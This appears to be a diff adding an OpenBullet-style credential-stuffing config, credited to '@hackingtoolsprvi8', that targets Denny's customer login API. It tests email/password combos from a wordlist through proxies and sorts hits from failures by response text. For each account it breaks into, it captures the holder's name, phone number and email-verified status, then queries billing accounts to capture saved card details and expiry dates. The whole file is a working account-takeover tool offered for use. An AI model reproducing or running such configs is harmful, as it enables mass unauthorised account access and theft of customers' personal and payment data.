@@ -1,0 +1,146 @@
+[SETTINGS]
+{
+  "Name": "Denny's(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-08T09:45:58.792188+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Dennys REQUEST POST "https://nomnom-prod-api.dennys.com/punchhv2/login" 
+  CONTENT "{\"user\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "clientid: dennys" 
+  HEADER "content-length: 55" 
+  HEADER "content-type: application/json" 
+  HEADER "nomnom-platform: web" 
+  HEADER "origin: https://www.dennys.com" 
+  HEADER "referer: https://www.dennys.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect information submitted. Please retry." 
+    KEY "Phone has already been taken" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+    KEY "token" 
+
+#token PARSE "<SOURCE>" JSON "token" -> VAR "token" 
+
+#FN PARSE "<SOURCE>" JSON "first_name" -> VAR "FN" 
+
+#LN PARSE "<SOURCE>" JSON "last_name" -> VAR "LN" 
+
+#Name FUNCTION Constant "<FN> <LN>" -> CAP "Name" 
+
+#Number PARSE "<SOURCE>" JSON "phone" CreateEmpty=FALSE -> CAP "Number" 
+
+#EmailVerified PARSE "<SOURCE>" JSON "email_verified" CreateEmpty=FALSE -> CAP "EmailVerified" 
+
+#Create REQUEST POST "https://nomnom-prod-api.dennys.com/users/getorcreate" 
+  CONTENT "{\"provider\":\"punchhdennys\",\"providertoken\":\"<token>\",\"provideruserid\":null,\"contactnumber\":\"<Number>\",\"basketid\":null,\"authtoken\":null,\"ignore\":null}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "clientid: dennys" 
+  HEADER "content-length: 208" 
+  HEADER "content-type: application/json" 
+  HEADER "nomnom-platform: web" 
+  HEADER "origin: https://www.dennys.com" 
+  HEADER "referer: https://www.dennys.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36" 
+
+#authtoken PARSE "<SOURCE>" JSON "authtoken" -> VAR "authtoken" 
+
+#Wallet REQUEST GET "https://nomnom-prod-api.dennys.com/users/<authtoken>/billingaccounts" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "clientid: dennys" 
+  HEADER "content-type: application/json" 
+  HEADER "nomnom-platform: web" 
+  HEADER "origin: https://www.dennys.com" 
+  HEADER "referer: https://www.dennys.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36" 
+
+#CardInfo PARSE "<SOURCE>" JSON "description" CreateEmpty=FALSE -> CAP "CardInfo" 
+
+#CardExpire PARSE "<SOURCE>" JSON "expiration" CreateEmpty=FALSE -> CAP "CardExpire" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "[]" 
+  KEYCHAIN Success OR 
+    KEY "cardtype" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
